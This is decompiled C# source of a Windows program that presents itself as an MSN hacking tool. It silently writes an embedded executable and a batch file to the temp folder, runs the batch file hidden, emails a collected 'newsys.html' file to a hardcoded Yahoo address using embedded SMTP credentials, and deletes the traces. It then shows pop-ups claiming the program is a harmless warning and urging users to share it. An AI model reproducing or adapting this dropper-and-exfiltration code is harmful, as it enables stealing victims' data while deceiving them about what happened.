using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using eleosff.My.Resources;

namespace eleosff;

[StandardModule]
internal sealed class Module1
{
	[STAThread]
	public static void Main()
	{
		//IL_0178: Unknown result type (might be due to invalid IL or missing references)
		//IL_0185: Unknown result type (might be due to invalid IL or missing references)
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_019f: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Unknown result type (might be due to invalid IL or missing references)
		Console.WriteLine("Loading...please wait....");
		string tempPath = Path.GetTempPath();
		byte[] start = Resources.start1;
		File.WriteAllBytes(tempPath + "\\sys.exe", start);
		string start2 = Resources.start;
		StreamWriter streamWriter = new StreamWriter(tempPath + "\\test.bat");
		streamWriter.Write(start2);
		streamWriter.Close();
		Process process = new Process();
		process.StartInfo.FileName = tempPath + "\\test.bat";
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.Start();
		process.WaitForExit();
		SmtpClient smtpClient = new SmtpClient("smtp.mail.yahoo.com", 25);
		NetworkCredential networkCredential = new NetworkCredential();
		networkCredential.UserName = "testingstufftestingstuff@yahoo.com";
		networkCredential.Password = "asdasdasdoi";
		smtpClient.Credentials = networkCredential;
		Console.WriteLine("Loading necessary modules...");
		MailMessage mailMessage = new MailMessage();
		mailMessage.From = new MailAddress("testingstufftestingstuff@yahoo.com");
		mailMessage.Subject = "test";
		mailMessage.To.Add(new MailAddress("testingstufftestingstuff@yahoo.com"));
		Attachment attachment = new Attachment(tempPath + "\\newsys.html");
		mailMessage.Attachments.Add(attachment);
		smtpClient.Send(mailMessage);
		attachment.ContentStream.Close();
		Console.WriteLine("Done");
		File.Delete(tempPath + "\\sys.exe");
		File.Delete(tempPath + "\\test.bat");
		File.Delete(tempPath + "\\newsys.html");
		Interaction.MsgBox((object)"THIS DOESNT WORK DUDE", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"NEVER DOWNLOAD SUCH STUFF, BECAUSE ALMOST ALL OF THEM ARE FAKE", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"THE REASON I MADE THIS SIMPLE APP IS TO MAKE YOU UNDERSTAND THAT THESE KIND OF PROGRAMS DONT EXIST, BECAUSE THEY CANT EXIST", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"Microsoft is well secured and they would never let a simple app get information from their servers like usernames,passwords etc", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"they are not that dumb", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"SEND THIS TO EVERYBODY, THE WORLD NEEDS TO KNOW, STOP DOWNLOADING MSN HAX0RE APPS BECAUSE THEY ARE ALL FAKE", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"DONT FORGET TO SEED", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"Have a nice day :)", (MsgBoxStyle)0, (object)null);
	}
}
